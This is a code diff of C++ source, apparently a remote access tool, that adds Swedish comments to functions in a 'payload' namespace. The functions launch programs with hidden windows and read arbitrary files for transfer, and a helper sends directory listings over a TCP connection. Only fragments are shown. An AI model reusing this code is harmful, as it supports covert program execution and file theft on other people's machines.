@@ -5,9 +5,9 @@
 
 namespace helper {
 	void send_directory(tcp_client c, std::vector<dir_item> items) {
-		c.send({ "dir_status", std::to_string(items.size()) });
+		c.send({ "dir_status", std::to_string(items.size()) }); // skicka antal element i mappen
 		for (auto [item, size] : items) {
-			message msg{ "filedescription", item.string() + "|" + std::to_string(size) };
+			message msg{ "filedescription", item.string() + "|" + std::to_string(size) }; // skapa meddelande med fil namn och storlek
 			c.send(msg);
 			std::cout << "send()[" << msg.buffer() << "] - " << Error(0)<< std::endl;
 		}
@@ -28,10 +28,12 @@ namespace helper {
 namespace payload {
 
 	bool process_execution(std::string program, bool hide) {
-		STARTUPINFOA info = { sizeof(info) };
+		STARTUPINFOA info = { sizeof(info) }; 
 		PROCESS_INFORMATION process_info;
 		info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-		if (hide) {
+		
+		// om processen ska gömmas så göm
+		if (hide) { 
 			info.wShowWindow = SW_HIDE;
 		}
 		else {
@@ -69,9 +71,9 @@ namespace payload {
 	}
 
 	std::string download_file(std::string program) {
-		if (std::filesystem::exists(program)) {
-			std::ifstream file(program, std::ios::binary);
-			return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+		if (std::filesystem::exists(program) && !std::filesystem::is_directory(program)) { // om filen exsiterar och inte är en mapp
+			std::ifstream file(program, std::ios::binary); // läs in filen binärt
+			return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>()); // konvertera filen till en sträng med itrator konstruktion
 		}
 		else {
 			return "FAIL";
